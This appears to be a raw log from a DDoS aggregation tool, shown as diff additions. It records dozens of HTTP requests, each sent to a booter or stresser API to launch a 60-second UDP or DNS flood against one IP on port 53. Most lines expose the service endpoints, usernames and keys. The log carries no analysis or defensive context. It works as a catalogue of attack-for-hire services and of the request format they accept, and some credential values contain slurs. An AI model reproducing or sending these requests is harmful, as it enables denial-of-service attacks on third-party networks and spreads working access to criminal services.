+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://api.jetstress.su/?token=NQV083R2WjJCfYmXd2idvY&host=70.70.70.59&port=53&time=60&method=udp-a2s - Get "https://api.jetstress.su/?token=NQV083R2WjJCfYmXd2idvY&host=70.70.70.59&port=53&time=60&method=udp-a2s": dial tcp: lookup api.jetstress.su: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.59&time=60&port=53&method=UDP-BYPASS
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=world&secret=123123&host=70.70.70.59&time=60&port=53&method=dns
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=kieran&host=70.70.70.59&port=53&time=60&method=udpbypass
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.59&port=53&time=60&method=UDPDROP
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.colombia-c2.wtf/api/attack?username=project&secret=passwd&host=70.70.70.59&time=60&port=53&method=udp
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://apisystem.herios-stress.xyz/api/attack?username=whosdior&key=changeme&host=70.70.70.59&port=53&time=60&method=dns - Get "https://apisystem.herios-stress.xyz/api/attack?username=whosdior&key=changeme&host=70.70.70.59&port=53&time=60&method=dns": tls: failed to verify certificate: x509: certificate signed by unknown authority
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.59&port=53&duration=60&method=udpplain - Get "https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.59&port=53&duration=60&method=udpplain": tls: failed to verify certificate: x509: certificate signed by unknown authority
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=sexybrofrngl&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123vts&host=70.70.70.59&port=53&time=60&method=gudp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123vts&host=70.70.70.59&port=53&time=60&method=gudp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=changeme&host=70.70.70.59&port=53&time=60&method=udp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=changeme&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=star&key=strrfrgg010&host=70.70.70.59&port=53&time=60&method=udp - Get "https://theeyeapi.unhittable.gg/api/attack?username=star&key=strrfrgg010&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123123&host=70.70.70.59&port=53&time=60&method=gudp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123123&host=70.70.70.59&port=53&time=60&method=gudp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:14 [ATTACK] Sending request to: http://93.123.85.53/api.php?key=flshhhh&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://aetherapi.com/api/attack?username=begs&secret=balls&host=70.70.70.59&port=53&time=60&method=api-udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=snowy&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&key=snowy&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Error sending request to: https://api.spacevin.io/api/?token=bCvI7qNvWSTiwZZTWYEpYZ&host=70.70.70.59&port=53&time=60&method=udp - Get "https://api.spacevin.io/api/?token=bCvI7qNvWSTiwZZTWYEpYZ&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup api.spacevin.io: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:14 [ATTACK] Sending request to: https://wrldsecurity.net/api/attack?username=pathc2api&secret=643t5ge4336y3467y34&host=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:14 [ATTACK] Sending request to: http://2.59.117.173:555/api/?key=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 New Attack (API)!
+Username: root
+Target: 70.70.70.59
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.59&port=53&time=60&method=l4-udp - Get "https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.59&port=53&time=60&method=l4-udp": dial tcp: lookup private.bartrickc2.ovh: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.59&port=53&time=60&method=udp - Get "https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup brainc2.uk: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123vts&host=70.70.70.59&port=53&time=60&method=gudp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123vts&host=70.70.70.59&port=53&time=60&method=gudp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.59&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns - Get "http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.59&port=53&time=60&method=out-udp&concs=1 - Get "https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.59&port=53&time=60&method=out-udp&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.59&port=60&time=60&method=udp - Get "http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.59&port=60&time=60&method=udp": dial tcp: lookup toxicipstresser.cloud: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.jetstress.su/?token=NQV083R2WjJCfYmXd2idvY&host=70.70.70.59&port=53&time=60&method=udp-a2s - Get "https://api.jetstress.su/?token=NQV083R2WjJCfYmXd2idvY&host=70.70.70.59&port=53&time=60&method=udp-a2s": dial tcp: lookup api.jetstress.su: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.59&port=53&time=60&method=dns - Get "https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup gorilla-api.su: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.59&port=53&time=60&method=!udp - Get "https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.59&port=53&time=60&method=!udp": dial tcp: lookup homicide-api.lol: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=changeme&host=70.70.70.59&port=53&time=60&method=udp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=changeme&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.59&port=53&time=60&method=udp - Get "http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.59&port=53&duration=60&method=UDP - Get "http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.59&port=53&duration=60&method=UDP": dial tcp: lookup chronos.awaken-network.net: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.59&port=53&time=60&method=udp_api - Get "http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.59&port=53&time=60&method=udp_api": dial tcp: lookup connect-synth.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=star&key=strrfrgg010&host=70.70.70.59&port=53&time=60&method=udp - Get "https://theeyeapi.unhittable.gg/api/attack?username=star&key=strrfrgg010&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP - Get "https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP": dial tcp: lookup phantom.cool: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.spacevin.io/api/?token=bCvI7qNvWSTiwZZTWYEpYZ&host=70.70.70.59&port=53&time=60&method=udp - Get "https://api.spacevin.io/api/?token=bCvI7qNvWSTiwZZTWYEpYZ&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup api.spacevin.io: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.59&port=53&time=60&method=udp-dn - Get "https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.59&port=53&time=60&method=udp-dn": dial tcp: lookup api.stdstresser.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.59&port=53&time=60&method=udp-vip - Get "https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.59&port=53&time=60&method=udp-vip": dial tcp: lookup api.tsuki-solutions.cc: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.59&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.59&port=53&time=60&method=gudp - Get "http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.59&port=53&time=60&method=gudp": dial tcp: lookup hideaki-api.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123123&host=70.70.70.59&port=53&time=60&method=gudp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=123123&host=70.70.70.59&port=53&time=60&method=gudp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://api.quantiumcode.pl/api/attack?host=70.70.70.59&port=53&time=60&method=udp-vip&key=1234&username=darkc2 - Get "http://api.quantiumcode.pl/api/attack?host=70.70.70.59&port=53&time=60&method=udp-vip&key=1234&username=darkc2": dial tcp: lookup api.quantiumcode.pl: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.59&port=53&time=60&method=udp-bypass - Get "https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.59&port=53&time=60&method=udp-bypass": dial tcp: lookup aggu.spacey.sh: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.59&port=53&time=60&method=GUDP - Get "https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.59&port=53&time=60&method=GUDP": dial tcp: lookup api.theeye.cloud: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=udpbypass - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=udpbypass": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=gudp_api
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.59&time=60&port=53&method=UDP-BYPASS&concurrents=1
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.59&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.59&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.59&port=53&time=60&method=!udpv2&concs=1 - Get "https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.59&port=53&time=60&method=!udpv2&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=gudp_api
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=pps - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=pps": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.59&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.59&port=53&time=60&method=GUDP - Get "https://api.theeye.cloud/api/attack?username=jman&key=jman1234&&host=70.70.70.59&port=53&time=60&method=GUDP": dial tcp: lookup api.theeye.cloud: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://akitz.online/api/attack?username=fedworld&key=fedworld&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://crtz.top/api/attack?username=tsukiapi&secret=wixkwn193jen&host=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=udp_api
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.59&time=60&port=53&method=UDP-BOOM&concurrents=1
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.papernetwork.xyz/api/attack?username=flcty&key=MBenz300&target=70.70.70.59&port=53&duration=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api-sona.xyz/api/attack?username=glock&secret=glock&host=70.70.70.59&port=53&time=60&method=udp-pps
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.59&port=53&time=60&method=UDPAU
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.59&port=53&time=60&method=UDPRANDOM
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=543u7yrf893wu65t3&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://kraysecurity.com/api/api.php?key=0sUU6IW0ZAaUllWX&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.59&port=53&time=60&method=UDP-PPS
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.59&port=53&time=60&method=udpbypass
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:16 [ATTACK] Sending request to: http://toxic-c2.de:6969/api/attack?username=vse&secret=getfucked&host=70.70.70.59&port=53&time=60&method=UDP-VSE
+2024/12/10 16:41:16 [ATTACK] Sending request to: http://93.123.85.244/api/attack?username=begs&key=noballs&host=70.70.70.59&time=60&port=60&method=UDP-LONE
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.59&time=60&port=53&method=UDP-BYPASS
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://miami-api.cc/api/attack?username=flcty&secret=RyXMfmrXu10s&target=70.70.70.59&port=53&duration=60&method=!UDP
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=begs&key=balls&host=70.70.70.59&port=53&time=60&method=udp-dose
+2024/12/10 16:41:16 [ATTACK] Sending request to: http://ddos.africa:8080/api/attack?username=moneky&password=monkey&target=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: http://proxy.blanknetwork.fun:8080/api/attack?username=begs&password=123&target=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:16 [ATTACK] Sending request to: http://85.192.56.228/api.php?key=milka&target=70.70.70.59&duration=60&method=gudp&method_type=udp&port=53
+2024/12/10 16:41:16 [ATTACK] Sending request to: http://satanservices.xyz/api/attack?username=lixl&key=iPxrkan&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=projectworld&key=projectworld121&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.leanc2.dev/api/attack?username=fedworld&key=7A8hgFeWq33&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://kodachi.xyz/api/attack?username=api&key=api1234&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.vacstresser.ru/api?key=e87a0d23-f8c1-4525-bdef-c52425eb7e71&host=70.70.70.59&port=53&duration=60&method=UDPBYPASS
+2024/12/10 16:41:16 [ATTACK] Sending request to: http://2.59.117.173:555/api/?key=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.59&time=60&port=53&method=UDP-PPS
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.colombia-c2.wtf/api/attack?username=project&secret=passwd&host=70.70.70.59&time=60&port=53&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.arthurc2.xyz/api/attack?username=begs&secret=balls&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=kieran&host=70.70.70.59&port=53&time=60&method=udpbypass
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://api.skibidi.sbs/api/attack?username=tonhocau&secret=change&host=70.70.70.59&port=53&time=60&method=dns - Get "https://api.skibidi.sbs/api/attack?username=tonhocau&secret=change&host=70.70.70.59&port=53&time=60&method=dns": stopped after 10 redirects
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=world&secret=123123&host=70.70.70.59&time=60&port=53&method=dns
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.inverse.sh?token=ctKmcvX4aeZVXLF2O28uHx&host=70.70.70.59&port=53&time=60&method=UDP-SOURCE
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.59&port=53&time=60&method=!udpplain
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.inverse.sh?token=2DrvPtgCrvqT0x04XmSOsY&target={target}&port={port}&duration={duration}&method=UDP-SOURCE&concs=2
+2024/12/10 16:41:16 [ATTACK] Error sending request to: http://saturncnc.fun:4546/api/start?username=begs&key=balls&host=70.70.70.59&port=53&time=60&method=!GUDP&pps=-1&threads=10 - Get "http://saturncnc.fun:4546/api/start?username=begs&key=balls&host=70.70.70.59&port=53&time=60&method=!GUDP&pps=-1&threads=10": dial tcp 51.38.67.89:4546: connectex: Nie można nawiązać połączenia, ponieważ komputer docelowy aktywnie go odmawia.
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.59&port=53&time=60&method=!udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.frosty.rip/rocky/api/v1/attack?license=saturnednigga&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.frosty.rip/kittybooter/api/v1/attack?license=saturnednigga&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://aetherapi.com/api/attack?username=begs&secret=balls&host=70.70.70.59&port=53&time=60&method=api-udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.59&port=53&time=60&method=udp
